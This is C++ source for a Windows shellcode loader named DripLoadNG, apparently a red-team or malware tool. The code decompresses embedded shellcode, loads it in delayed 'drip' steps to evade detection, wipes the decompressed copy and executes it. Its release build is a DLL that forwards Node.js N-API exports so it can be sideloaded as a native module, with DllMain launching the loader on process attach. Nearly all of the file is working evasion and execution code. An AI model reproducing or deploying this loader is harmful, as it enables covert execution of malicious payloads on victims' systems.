#include <Windows.h>
#include <vector>

#include "drip.h"
#include "util.h"

static VOID executeShellcode(PVOID baseAddr)
{
	auto pBaseAddr = (void(*)())baseAddr;
	pBaseAddr();
}

static VOID wipeDecompressedShellcode(PVOID shellcode, SIZE_T shellcodeLength)
{
	SecureZeroMemory(shellcode, shellcodeLength);
	free(shellcode);
}

static VOID DripLoadNG()
{
	SIZE_T shellcodeLength = 0;
	PUCHAR decompressedShellcode = DecompressShellcode(&shellcodeLength);
	if (decompressedShellcode == nullptr)
	{
		DEBUG_LOG("Failed to decompress shellcode\n");
		return;
	}
	Delay(100);

	PVOID drippedShellcode = DripLoader(decompressedShellcode, shellcodeLength);
	if (drippedShellcode == nullptr)
	{
		DEBUG_LOG("Failed to drip shellcode\n");
		return;
	}
	Delay(100);

	wipeDecompressedShellcode(decompressedShellcode, shellcodeLength);

	Delay(100);

	executeShellcode(drippedShellcode);
}

#ifdef _DEBUG
int main()
{
	DripLoadNG();
	return 0;
}

#else

// "NODEin60seconds - Outflank"
// https://vimeo.com/856314414
#pragma comment (linker, "/export:napi_register_module_v1=nativebindings.node.napi_register_module_v1,@1")
#pragma comment (linker, "/export:node_api_module_get_api_version_v1=nativebindings.node.node_api_module_get_api_version_v1,@2")

static BOOL sideload()
{
	DWORD threadId = 0;
	HANDLE hThread = CreateThread(
		NULL,
		0,
		(LPTHREAD_START_ROUTINE)DripLoadNG,
		NULL,
		0,
		&threadId
	);
	if (hThread == NULL)
	{
		DEBUG_LOG("Failed to create thread: 0x%lu\n", GetLastError());
		return FALSE;
	}

	return TRUE;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
	switch (fdwReason) {
	case DLL_PROCESS_ATTACH:
		if (!sideload())
			return FALSE;
		break;

	case DLL_PROCESS_DETACH:
		break;

	case DLL_THREAD_ATTACH:
		break;

	case DLL_THREAD_DETACH:
		break;
	}

	return TRUE;
}
#endif
